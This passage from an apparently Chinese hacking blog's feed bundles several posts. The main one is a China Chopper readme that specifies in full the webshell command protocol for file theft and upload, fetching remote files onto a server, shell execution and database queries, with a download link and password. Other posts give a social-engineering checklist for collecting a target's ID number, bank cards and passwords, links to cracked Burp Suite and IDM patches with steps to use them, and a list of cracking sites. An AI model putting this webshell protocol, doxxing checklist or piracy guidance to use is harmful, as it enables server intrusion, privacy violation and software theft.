</code></pre><hr><p>新版本去掉了一些不想用的功能。</p><hr><h1 id="四、文件说明："><a href="#四、文件说明：" class="headerlink" title="四、文件说明："></a>四、文件说明：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">caidao.exe	菜刀程序</div><div class="line">db.mdb		菜刀的主数据库</div><div class="line">caidao.conf	配置文件（重要，千万别删除）</div><div class="line">cache.tmp	菜刀的缓存数据库(可删除)</div><div class="line">readme.txt	你现在正在看的(可删除)</div><div class="line">ip.dat		一个IP库，用于IP地址识别(可删除)</div><div class="line">&lt;CCC&gt;		菜刀的自写脚本目录(可删除)</div><div class="line">&lt;Customize&gt;	Customize模式的服务端(可删除)</div><div class="line">	Customize.aspx	这是一个C#的示例服务端(全功能)</div><div class="line">	Customize.jsp	这是一个jsp的示例服务端(全功能)</div><div class="line">	Customize.cfm	这是一个cfm的示例服务端(文件管理，虚拟终端)</div></pre></td></tr></table></figure><h1 id="五、附Customize模式菜刀和服务端通信接口"><a href="#五、附Customize模式菜刀和服务端通信接口" class="headerlink" title="五、附Customize模式菜刀和服务端通信接口"></a>五、附Customize模式菜刀和服务端通信接口</h1><p>其它语言的服务端代码可按此接口来编写(请参照Customize.jsp/Customize.cfm/Customize.aspx)</p><p>例：菜刀客户端填写的密码为pass，网页编码选的是GB2312(Jsp服务端会用到此参数)<br>注：所有参数都以POST提交，<br>返回的数据都要以配置文件caidao.conf中的FLAG节点填写的标记分隔<br>提交的参数z0.z1.z2…<br>注：返回的错误信息开头包含ERROR://<br>注：\t代表制表符TAB，\r\n代表换行回车，\n代表回车<br>注：数据库配置信息是一个字符串，服务端脚本可以对此字符串格式进行自定义。</p><p>[得到当前目录的绝对路径]<br>提交：pass=A&amp;z0=GB2312<br>返回：目录的绝对路径\t，如果是Windows系统后面接着加上驱动器列表<br>示例：c:\inetpub\wwwroot\ C:D:E:K:<br>示例：/var/www/html/</p><p>[目录浏览]<br>提交：pass=B&amp;z0=GB2312&amp;z1=目录绝对路径<br>返回：先目录后文件,目录名后要加/，文件名后不要加/<br>示例：<br>目录名/\t时间\t大小\t属性\n目录名/\t时间\t大小\t属性\n<br>文件名\t时间\t大小\t属性\n文件名\t时间\t大小\t属性\n</p><p>[读取文本文件]<br>提交：pass=C&amp;z0=GB2312&amp;z1=文件绝对路径<br>返回：文本文件的内容</p><p>[写入文本文件]<br>提交：pass=D&amp;z0=GB2312&amp;z1=文件绝对路径&amp;z2=文件内容<br>返回：成功返回1,不成功返回错误信息</p><p>[删除文件或目录]<br>提交：pass=E&amp;z0=GB2312&amp;z1=文件或目录的绝对路径<br>返回：成功返回1,不成功返回错误信息</p><p>[下载文件]<br>提交：pass=F&amp;z0=GB2312&amp;z1=服务器文件的绝对路径<br>返回：要下载文件的内容</p><p>[上传文件]<br>提交：pass=G&amp;z0=GB2312&amp;z1=文件上传后的绝对路径&amp;z2=文件内容(十六进制文本格式)<br>返回：要下载文件的内容</p><p>[复制文件或目录后粘贴]<br>提交：pass=H&amp;z0=GB2312&amp;z1=复制的绝对路径&amp;z2=粘贴的绝对路径<br>返回：成功返回1,不成功返回错误信息</p><p>[文件或目录重命名]<br>提交：pass=I&amp;z0=GB2312&amp;z1=原名(绝对路径)&amp;z2=新名(绝对路径)<br>返回：成功返回1,不成功返回错误信息</p><p>[新建目录]<br>提交：pass=J&amp;z0=GB2312&amp;z1=新目录名(绝对路径)<br>返回：成功返回1,不成功返回错误信息</p><p>[修改文件或目录时间]<br>提交：pass=K&amp;z0=GB2312&amp;z1=文件或目录的绝对路径&amp;z2=时间(格式：yyyy-MM-dd HH:mm:ss)<br>返回：成功返回1,不成功返回错误信息</p><p>[下载文件到服务器]<br>提交：pass=L&amp;z0=GB2312&amp;z1=URL路径&amp;z2=下载后保存的绝对路径<br>返回：成功返回1,不成功返回错误信息</p><p>[执行Shell命令(Shell路径前会根据服务器系统类型加上-c或/c参数)]<br>提交：pass=M&amp;z0=GB2312&amp;z1=(-c或/c)加Shell路径&amp;z2=Shell命令<br>返回：命令执行结果</p><p>[得到数据库基本信息]<br>提交：pass=N&amp;z0=GB2312&amp;z1=数据库配置信息<br>返回：成功返回数据库(以制表符\t分隔)， 不成功返回错误信息</p><p>[获取数据库表名]<br>提交：pass=O&amp;z0=GB2312&amp;z1=数据库配置信息\r\n数据库名<br>返回：成功返回数据表(以\t分隔)， 不成功返回错误信息</p><p>[获取数据表列名]<br>提交：pass=P&amp;z0=GB2312&amp;z1=数据库配置信息\r\n数据库名\r\n数据表名<br>返回：成功返回数据列(以制表符\t分隔)， 不成功返回错误信息</p><p>[执行数据库命令]<br>提交：pass=Q&amp;z0=GB2312&amp;z1=数据库配置信息\r\n数据库名&amp;z2=SQL命令<br>返回：成功返回数据表内容， 不成功返回错误信息<br>注意：返回的第一行为表头，接下去每行分别在列表中显示，列数要求一致。行中的每列后加上\t|\t标记，每行以标记\r\n为结束</p><hr><pre><code>菜刀 七岁了 感谢有你一路陪伴成长!
















                L408179
</code></pre><hr><h2 id="0x03-下载"><a href="#0x03-下载" class="headerlink" title="0x03 下载"></a>0x03 下载</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">下载地址:[https://github.com/4ido10n/caidao-20160620-www.maicaidao.com][3]</div><div class="line"></div><div class="line">解压密码:www.maicaidao.com</div><div class="line"></div><div class="line">压缩包caidao-20160620-www.maicaidao.com.zip:</div><div class="line">MD5: 75F9C0EA9CE2BA266560FE3364127AE3</div><div class="line">SHA1: 3C87E017E3CF77C06827C587E43F902E6AF7B6B8</div><div class="line"></div><div class="line">caidao.exe： </div><div class="line">MD5:AC86066FFD58779F4C0DB5030574B0CB</div><div class="line">SHA1: 02C1725FA5865A4BE0F4A040BFDBC4B30B628D8C</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> caidao-20160620 </tag>
            
            <tag> 中国菜刀 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[社会工程学概念与达到要求参考]]></title>
      <url>/2016/06/11/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%A6%82%E5%BF%B5%E4%B8%8E%E8%BE%BE%E5%88%B0%E8%A6%81%E6%B1%82%E5%8F%82%E8%80%83/</url>
      <content type="html"><![CDATA[<p><img src="https://www.hackfun.org/usr/uploads/2016/06/2050202460.jpg" alt="欺骗的艺术.jpg"></p><h2 id="0x00-社会工程学"><a href="#0x00-社会工程学" class="headerlink" title="0x00 社会工程学"></a>0x00 社会工程学</h2><p>社会工程学的概念最早是由著名黑客凯文・米特尼克在《欺骗的艺术》中提出的。目前，对于社会工程学并没有一个规范化的定义。根据《欺骗的艺术》中的描述，可以将其总结为: 社会工程学就是通过自然的、社会的和制度上的途径，利用人的心理弱点( 如人的本能反应、好奇心、信任、贪婪) 以及规则制度上的漏洞，在攻击者和被攻击者之间建立起信任关系，获得有价值的信息，最终可以通过未经用户授权的路径访问某些敏感数据和隐私数据。</p><p>一般地，社会工程学是一种通过对被攻击者的心理弱点、本能反应以及好奇心、信任、贪婪等心理陷阱进行的诸如欺骗、伤害等危害手段，获取非法利益的行为，这种行为或案例近年来已经呈现显著的上升甚至于泛滥的态势。社会工程学与一般的欺骗手法有着显著的区别，社会工程学的原理通常十分复杂，事实上，社会工程学整合了社会学、行为心理学、认知科学等多个学科门类的技术与方法，往往让人防不胜防，即使那些警惕心非常高的人，往往糊里糊涂地被高明的社会工程学手段所损害，甚至还会出现被人卖了还帮人数钱的现象。社会工程学攻击往往从通常的交谈、欺骗、假冒或口语等非常普通的社会交往方式开始，从合法用户中隐蔽地套取用户系统的秘密和潜在的敏感信息，进而为后续的网络攻击提供方便。这些通过蒙敝、影响、劝导来达到获取信息的人，还有一个听起来似乎很高大上的职业名称，就是社会工程师。</p><h2 id="0x01-社会工程学达到要求参考"><a href="#0x01-社会工程学达到要求参考" class="headerlink" title="0x01 社会工程学达到要求参考"></a>0x01 社会工程学达到要求参考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">1.姓名</div><div class="line">2.性别</div><div class="line">3.职位</div><div class="line">4.照片</div><div class="line">5.兴趣爱好</div><div class="line">6.实际出生日期</div><div class="line">7.身份证出生日期</div><div class="line">8.身份证号码</div><div class="line">9.身份证家庭住址</div><div class="line">10.家庭成员</div><div class="line">11.社会关系</div><div class="line">12.快递收货地址</div><div class="line">13.教育经历</div><div class="line">14.QQ</div><div class="line">15.微信</div><div class="line">16.邮箱</div><div class="line">17.手机号（曾用与现用）</div><div class="line">18.银行卡</div><div class="line">19.电子邮箱</div><div class="line">20.支付宝</div><div class="line">21.各社交平台主页(QQ空间,微博,人人网,百度贴吧,校友网,facebook,twitter等)</div><div class="line">22.常用ID</div><div class="line">23.常用密码</div><div class="line">24.常用密码组合</div><div class="line">25.性格素描</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 社会工程学 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Burpsuite Pro v1.6.38 介绍和破解版下载]]></title>
      <url>/2016/06/09/Burpsuite-Pro-v1.6.38-%E4%BB%8B%E7%BB%8D%E5%92%8C%E7%A0%B4%E8%A7%A3%E7%89%88%E4%B8%8B%E8%BD%BD/</url>
      <content type="html"><![CDATA[<p><img src="https://www.hackfun.org/usr/uploads/2016/06/1416077133.jpg" alt="1.6.38.jpg"></p><h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p><h2 id="0x01-特点"><a href="#0x01-特点" class="headerlink" title="0x01 特点"></a>0x01 特点</h2><p>1.Target(目标)——显示目标目录结构的的一个功能<br>2.Proxy(代理)——拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。<br>3.Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。<br>4.Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。<br>5.Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。<br>6.Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。<br>7.Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。<br>8.Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。<br>9.Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。<br>10.Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。<br>11.Options(设置)——对Burp Suite的一些设置</p><h2 id="0x02-工作流程"><a href="#0x02-工作流程" class="headerlink" title="0x02 工作流程"></a>0x02 工作流程</h2><p><img src="https://www.hackfun.org/usr/uploads/2016/06/366930440.png" alt="2014101711120074380.png"></p><h2 id="0x03-下载"><a href="#0x03-下载" class="headerlink" title="0x03 下载"></a>0x03 下载</h2><p><a href="https://github.com/4ido10n/Burpsuite-Pro-v1.6.38-crack" target="_blank" rel="external">https://github.com/4ido10n/Burpsuite-Pro-v1.6.38-crack</a></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> bursuite pro cracked </tag>
            
            <tag> burpsuite pro v1.6.38 cracked </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[最新Internet Download Manager (IDMan) 6.25 Build 20 32位 64位注册破解补丁]]></title>
      <url>/2016/06/06/%E6%9C%80%E6%96%B0Internet-Download-Manager-(IDMan)-6.25-Build-20-32%E4%BD%8D-64%E4%BD%8D%E6%B3%A8%E5%86%8C%E7%A0%B4%E8%A7%A3%E8%A1%A5%E4%B8%81/</url>
      <content type="html"><![CDATA[<p><img src="https://www.hackfun.org/usr/uploads/2016/06/618009904.png" alt="0.png"></p><h2 id="0x00-IDMan介绍"><a href="#0x00-IDMan介绍" class="headerlink" title="0x00 IDMan介绍"></a>0x00 IDMan介绍</h2><p>Internet Download Manager提升你的下载速度最多达5倍，安排下载时程，或续传一半的软件。Internet Download Manager的续传功能可以恢复因为断线、网络问题、计算机当机甚至无预警的停电导致下载中断。此程序具有动态档案分割、多重下载点技术，而且它会重复使用现有的联机，而不需再重新联机登入一遍。聪明的in-speed技术会动态地将所有设定应用到某种联机类型，以充分利用下载速度。</p><a id="more"></a><p>Internet Download Manager支持下载队列、防火墙、代理服务器和映射服务器、重新导向、cookies、需要验证的目录，以及各种不同的服务器平台。此程序紧密地与Internet Explorer和Netscape Communicator结合，自动地处理你的下载需求。此程序还具有下载逻辑最佳化功能、检查病毒，以及多种偏好设定。</p><p>其他功能包括多语言支持,zip预览,下载类别管理,个人计划下载任务,不同的事件声音提示,HTTPS协议支持,下载队列处理,html帮助教程,加强下载病毒防护,渐进式下载与配额,内置下载加速器,和分享功能。</p><p>6.25版本增加了Windows 10兼容性,增加IDM下载面板网络播放器,可用于从MySpaceTV等网站下载flash视频,等等。它还包括完整的Windows 8.1(Windows 8,Windows 7和Vista)的支持,视频页面打捞工具,重新调度器和MMS协议支持。新版本还增加了改进集成基于IE 11和IE浏览器,重新设计和增强的下载引擎,独特的先进的集成到所有最新的浏览器,改进的工具栏,和大量的其他改进和新特性。</p><h2 id="0x01-补丁使用"><a href="#0x01-补丁使用" class="headerlink" title="0x01 补丁使用"></a>0x01 补丁使用</h2><p>1.在<a href="http://www.internetdownloadmanager.com/download.html" target="_blank" rel="external">官网</a>下载最新Internet Download Manager (IDMan) 6.25 Build 20，或者直接下载我已在官网下载Internet Download Manager (IDMan) 6.25 Build 20的上传到github的<a href="https://github.com/4ido10n/Internet-Download-Manager-IDM-6.25-Build-20-Registered-32bit-64bit-Patch-CrackingPatching" target="_blank" rel="external">zip压缩包</a>，里面主要包含idman625build20.exe，32bit Patch build 20.exe，64bit Patch build 20.exe三个可执行文件。(文后给出了文件的MD5，SHA1校验)</p><p><img src="https://www.hackfun.org/usr/uploads/2016/06/3878049196.png" alt="1.png"></p><p>2.运行Hash_1.0.4.exe分别对文件进行校验。</p><p>3.运行安装idman625build20.exe，安装完毕之后软件会自动根据系统语言的设置提示你是否安装相应的语言包，根据个人需求选择之后退出软件。</p><p>4.根据系统类型选择相应的注册破解补丁并运行。(注意选择idman的安装路径)<br><img src="https://www.hackfun.org/usr/uploads/2016/06/1128793869.png" alt="2.png"></p><p>5.安装完成，查看注册信息。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/06/3196446624.png" alt="3.png"></p><p>6.如果需要卸载注册补丁，请到idman安装目录找到IDM Patch Uninstaller.exe并运行。</p><h2 id="0x02-文件hash校验"><a href="#0x02-文件hash校验" class="headerlink" title="0x02 文件hash校验"></a>0x02 文件hash校验</h2><p>文件: idman625build20.exe<br>MD5: 798DC55D616C16243CE6925914B193FD<br>SHA1: D2060323CCA42F79465F2D7EB192297869D8A497</p><p>文件: 32bit Patch build 20.exe<br>MD5: 06C046E1F8F424E0025D8DD883481D39<br>SHA1: CAE3F41CCBAA554921F8489F9CA2CC2724C402C6</p><p>文件: 64bit Patch build 20.exe<br>MD5: 0F79D34D0E5D1F5E2EFA3EC228413202<br>SHA1: DEB87D0433EA2693E7C39797C594FCF48B70D3D6</p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> idman </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[国外安全网站收集和介绍]]></title>
      <url>/2016/06/06/%E5%9B%BD%E5%A4%96%E5%AE%89%E5%85%A8%E7%BD%91%E7%AB%99%E6%94%B6%E9%9B%86%E5%92%8C%E4%BB%8B%E7%BB%8D/</url>
      <content type="html"><![CDATA[<p><img src="https://www.hackfun.org/usr/uploads/2016/06/2229847330.png" alt="edb-slider-edb.png"></p><h2 id="0x00-漏洞发布类"><a href="#0x00-漏洞发布类" class="headerlink" title="0x00 漏洞发布类"></a>0x00 漏洞发布类</h2><p><a href="http://exploit-db.com" target="_blank" rel="external">http://exploit-db.com</a><br><a href="http://www.exploit-id.com/" target="_blank" rel="external">http://www.exploit-id.com/</a><br><a href="http://cve.mitre.org/" target="_blank" rel="external">http://cve.mitre.org/</a><br><a href="http://www.securiteam.com/" target="_blank" rel="external">http://www.securiteam.com/</a><br><a href="http://securityvulns.com/" target="_blank" rel="external">http://securityvulns.com/</a> (更新至2015.02.11)<br><a href="http://securityvulns.ru/" target="_blank" rel="external">http://securityvulns.ru/</a><br><a href="http://www.securityfocus.com/" target="_blank" rel="external">http://www.securityfocus.com/</a><br><a href="http://marc.info/?l=bugtraq" target="_blank" rel="external">http://marc.info/?l=bugtraq</a><br><a href="http://www.securitytracker.com/" target="_blank" rel="external">http://www.securitytracker.com/</a></p><a id="more"></a><h2 id="0x01-破解类"><a href="#0x01-破解类" class="headerlink" title="0x01 破解类"></a>0x01 破解类</h2><p><a href="http://astalavista.box.sk" target="_blank" rel="external">http://astalavista.box.sk</a> (著名的软件破解网站)</p><h2 id="0x02-在线工具类"><a href="#0x02-在线工具类" class="headerlink" title="0x02 在线工具类"></a>0x02 在线工具类</h2><p><a href="http://objectif-securite.ch/" target="_blank" rel="external">http://objectif-securite.ch/</a> 在线LMHASH破解<br><a href="https://www.hashkiller.co.uk/" target="_blank" rel="external">https://www.hashkiller.co.uk/</a> hash破解<br><a href="https://github.com/" target="_blank" rel="external">https://github.com/</a> 全球知名在线管理开发平台<br><a href="http://astalavista.box.sk" target="_blank" rel="external">http://astalavista.box.sk</a> 最好的注册码、注册机、序列号搜索引擎<br><a href="http://www.s0ftpj.org/" target="_blank" rel="external">http://www.s0ftpj.org/</a> 意大利老站<br><a href="http://recover-weblogic-password.appspot.com/" target="_blank" rel="external">http://recover-weblogic-password.appspot.com/</a> 在线weblogic密文破解<br><a href="http://tools88.com/safe/vnc.php" target="_blank" rel="external">http://tools88.com/safe/vnc.php</a> 在线VNC密文破解<br><a href="http://www.vpnhunter.com/" target="_blank" rel="external">http://www.vpnhunter.com/</a> 在线查找VPN，mail接口<br><a href="http://mailinator.com" target="_blank" rel="external">http://mailinator.com</a> 一次性邮箱<br><a href="http://www.yopmail.com/zh/" target="_blank" rel="external">http://www.yopmail.com/zh/</a> 一次性邮箱<br><a href="https://www.guerrillamail.com/zh/" target="_blank" rel="external">https://www.guerrillamail.com/zh/</a> 一次性邮箱</p><h2 id="0x03-域名类"><a href="#0x03-域名类" class="headerlink" title="0x03 域名类"></a>0x03 域名类</h2><p><a href="http://toolbar.netcraft.com" target="_blank" rel="external">http://toolbar.netcraft.com</a> 很好的域名搜索引擎<br><a href="http://who.is" target="_blank" rel="external">http://who.is</a> 域名解析记录很好使<br><a href="http://crimeflare.com" target="_blank" rel="external">http://crimeflare.com</a> 查cloudflare真实ip百试不爽<br><a href="https://dnshistory.org/" target="_blank" rel="external">https://dnshistory.org/</a><br><a href="https://whoisrequest.com/history/" target="_blank" rel="external">https://whoisrequest.com/history/</a><br><a href="http://viewdns.info/iphistory/" target="_blank" rel="external">http://viewdns.info/iphistory/</a><br><a href="http://domaintools.com/" target="_blank" rel="external">http://domaintools.com/</a></p><h2 id="0x04-社区论坛类"><a href="#0x04-社区论坛类" class="headerlink" title="0x04 社区论坛类"></a>0x04 社区论坛类</h2><p><a href="http://www.experts-exchange.com" target="_blank" rel="external">www.experts-exchange.com</a> 全球有名的社区<br><a href="http://www.is-it-true.org" target="_blank" rel="external">www.is-it-true.org</a> 类似于FAQ的站点，资源丰富 　<br><a href="http://www.antionline.com/" target="_blank" rel="external">http://www.antionline.com/</a> 有些特色栏目的安全站<br><a href="http://hacker-newbie.org" target="_blank" rel="external">http://hacker-newbie.org</a><br><a href="http://www.hackforums.net" target="_blank" rel="external">http://www.hackforums.net</a><br><a href="http://hackhound.org" target="_blank" rel="external">http://hackhound.org</a><br><a href="https://rdot.org/forum/" target="_blank" rel="external">https://rdot.org/forum/</a> 毛子的站点<br><a href="http://ashiyane.org/" target="_blank" rel="external">http://ashiyane.org/</a> 波斯<br><a href="http://www.agarri.fr" target="_blank" rel="external">http://www.agarri.fr</a> 法国<br><a href="http://tuts4you.com/" target="_blank" rel="external">http://tuts4you.com/</a> 比较活跃<br><a href="http://forum.antichat.ru" target="_blank" rel="external">http://forum.antichat.ru</a><br><a href="https://evilzone.org" target="_blank" rel="external">https://evilzone.org</a><br><a href="http://www.security-portal.cz" target="_blank" rel="external">http://www.security-portal.cz</a> 捷克<br><a href="https://www.hacking-lab.com" target="_blank" rel="external">https://www.hacking-lab.com</a><br><a href="http://www.hacking-tutorial.com/" target="_blank" rel="external">http://www.hacking-tutorial.com/</a><br><a href="http://www.xcode.or.id/forum" target="_blank" rel="external">http://www.xcode.or.id/forum</a><br><a href="http://www.governmentsecurity.org/forum/" target="_blank" rel="external">http://www.governmentsecurity.org/forum/</a> 很火</p><h2 id="0x05-个人博客类"><a href="#0x05-个人博客类" class="headerlink" title="0x05 个人博客类"></a>0x05 个人博客类</h2><p><a href="http://www.insecure.org" target="_blank" rel="external">http://www.insecure.org</a> (Fyoderr的个人站点,即Nmap的老家) 　<br><a href="http://www.guninski.com/" target="_blank" rel="external">http://www.guninski.com/</a> 安全专家Guninski的主页，有大量由系统漏洞 具及源代码 　　<br><a href="http://blog.gentilkiwi.com/" target="_blank" rel="external">http://blog.gentilkiwi.com/</a> mimikatz<br><a href="https://www.schneier.com/" target="_blank" rel="external">https://www.schneier.com/</a> Bruce,Schneier的博客（专业Blackhat会棍）<br><a href="http://an7isec.blogspot.co.il/" target="_blank" rel="external">http://an7isec.blogspot.co.il/</a> “整蛊小黑必备” 博客 发现了WVS8版本远程溢出漏洞<br><a href="https://fail0verflow.com/blog/index.html" target="_blank" rel="external">https://fail0verflow.com/blog/index.html</a> 一个硬件牛的BLOG<br><a href="https://blog.0x80.org/" target="_blank" rel="external">https://blog.0x80.org/</a> 破解过jeep车锁的大牛<br><a href="https://www.netspi.com/blog" target="_blank" rel="external">https://www.netspi.com/blog</a> 对MSSQL渗透有研究的大牛<br><a href="http://hakin9.org" target="_blank" rel="external">http://hakin9.org</a><br><a href="http://websec.ca/blog" target="_blank" rel="external">http://websec.ca/blog</a> 渗透tips<br><a href="http://www.derkeiler.com/" target="_blank" rel="external">http://www.derkeiler.com/</a><br><a href="http://www.xssed.com/" target="_blank" rel="external">http://www.xssed.com/</a><br><a href="http://adsecurity.org/" target="_blank" rel="external">http://adsecurity.org/</a> 内网渗透、域渗透牛人<br><a href="http://securityxploded.com" target="_blank" rel="external">http://securityxploded.com</a><br><a href="http://www.devttys0.com/blog/" target="_blank" rel="external">http://www.devttys0.com/blog/</a> 国外路由器安全大牛</p><h2 id="0x06-综合类"><a href="#0x06-综合类" class="headerlink" title="0x06 综合类"></a>0x06 综合类</h2><p><a href="http://www.blackhat.com/" target="_blank" rel="external">http://www.blackhat.com/</a><br><a href="http://packetstormsecurity.com" target="_blank" rel="external">http://packetstormsecurity.com</a> (有大量exploit程序)<br><a href="http://www.ussrback.com/" target="_blank" rel="external">http://www.ussrback.com/</a> 比较活跃的安全站<br><a href="http://www.attrition.org/" target="_blank" rel="external">http://www.attrition.org/</a> 内容全面的安全站 　(更新至2013年)<br><a href="http://www.social-engineer.org/" target="_blank" rel="external">http://www.social-engineer.org/</a> 社会工程学研究所<br><a href="https://www.soldierx.com" target="_blank" rel="external">https://www.soldierx.com</a><br><a href="http://www.windowsecurity.com/" target="_blank" rel="external">http://www.windowsecurity.com/</a>(windowsnetworking.com)包含论坛、博客、新闻、工具<a href="http://windowsnetworking.com" target="_blank" rel="external">windowsnetworking.com</a><br><a href="http://www.blackmoreops.com" target="_blank" rel="external">http://www.blackmoreops.com</a><br><a href="http://www.securitytube.net" target="_blank" rel="external">http://www.securitytube.net</a> 大量视频</p><h2 id="0x07-媒体杂志类"><a href="#0x07-媒体杂志类" class="headerlink" title="0x07 媒体杂志类"></a>0x07 媒体杂志类</h2><p><a href="http://www.phrack.org" target="_blank" rel="external">http://www.phrack.org</a> (经典的黑客技术电子杂志) 　<br><a href="http://www.2600.com/" target="_blank" rel="external">http://www.2600.com/</a> 2600 Magazine 　<br><a href="http://www.infosecisland.com" target="_blank" rel="external">http://www.infosecisland.com</a><br><a href="http://resources.infosecinstitute.com" target="_blank" rel="external">http://resources.infosecinstitute.com</a></p><h2 id="0x08-安全公司类"><a href="#0x08-安全公司类" class="headerlink" title="0x08 安全公司类"></a>0x08 安全公司类</h2><p><a href="http://www.eeye.com/" target="_blank" rel="external">http://www.eeye.com/</a> eeye公司的主页，提供权威性的安全建议和工具 　<br><a href="http://www.scip.ch" target="_blank" rel="external">http://www.scip.ch</a><br><a href="http://census-labs.com" target="_blank" rel="external">http://census-labs.com</a><br><a href="http://labs.bromium.com" target="_blank" rel="external">http://labs.bromium.com</a><br><a href="http://www.metasploit.com/" target="_blank" rel="external">http://www.metasploit.com/</a><br><a href="http://www.red-database-security.com/" target="_blank" rel="external">http://www.red-database-security.com/</a><br><a href="http://www.aspitalia.com/" target="_blank" rel="external">http://www.aspitalia.com/</a><br><a href="http://www.argeniss.com/" target="_blank" rel="external">http://www.argeniss.com/</a><br><a href="http://www8.hp.com/" target="_blank" rel="external">http://www8.hp.com/</a><br><a href="http://www.argeniss.com/" target="_blank" rel="external">http://www.argeniss.com/</a><br><a href="https://www.trustedsec.com/" target="_blank" rel="external">https://www.trustedsec.com/</a><br><a href="http://perception-point.io/" target="_blank" rel="external">http://perception-point.io/</a></p><h2 id="0x09-黑客组织类"><a href="#0x09-黑客组织类" class="headerlink" title="0x09 黑客组织类"></a>0x09 黑客组织类</h2><p><a href="http://www.w00w00.org/" target="_blank" rel="external">http://www.w00w00.org/</a> w00w00组织的主页</p><h2 id="0x0a-说明"><a href="#0x0a-说明" class="headerlink" title="0x0a 说明"></a>0x0a 说明</h2><p>感谢<a href="https://www.t00ls.net/space.php?uid=6517" target="_blank" rel="external">Mir4cl3</a>小伙伴的整理，墙外的世界真自由！</p>]]></content>
      
        <categories>
            
            <category> 学习记录 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 国外安全网站 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[v0lt CTF安全工具包]]></title>
      <url>/2016/05/27/v0lt-CTF%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%8C%85/</url>
      <content type="html"><![CDATA[<p><img src="http://www.isecer.com/usr/uploads/2016/04/1444354571.png" alt="v0lt.png"></p><h2 id="0×00-v0lt"><a href="#0×00-v0lt" class="headerlink" title="0×00 v0lt"></a>0×00 v0lt</h2><p>v0lt是一个我尝试重组每一个我使用过的/现在在使用的/将来要用的用python开发的安全领域CTF工具。实践任务可能会采用bash脚本来解决，但我认为Python更具有灵活性，这也是我做出这一选择的原因。和丹麦CTF队伍Gallopsled开发的pwntools 没有关系，v0lt只是一个小型灵活但是却具有一些特别功能的工具包。</p><a id="more"></a><h2 id="0×01-要求和安装"><a href="#0×01-要求和安装" class="headerlink" title="0×01 要求和安装"></a>0×01 要求和安装</h2><p><strong>依赖关系:</strong></p><ul><li>Libmagic</li><li>Python3</li></ul><ol><li>BeautifulSoup</li><li>Requests</li><li>filemagic</li><li>hexdump</li><li>passlib</li></ol><p><strong>安装:</strong><br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/P1kachu/v0lt.git</div><div class="line">cd v0lt</div><div class="line">[sudo] python3 setup.py install # 要求sudo执行是因为可能存在缺失的依赖关系</div></pre></td></tr></table></figure><p></p><p><strong>实例: Shellcodes</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> v0lt <span class="keyword">import</span> *</div><div 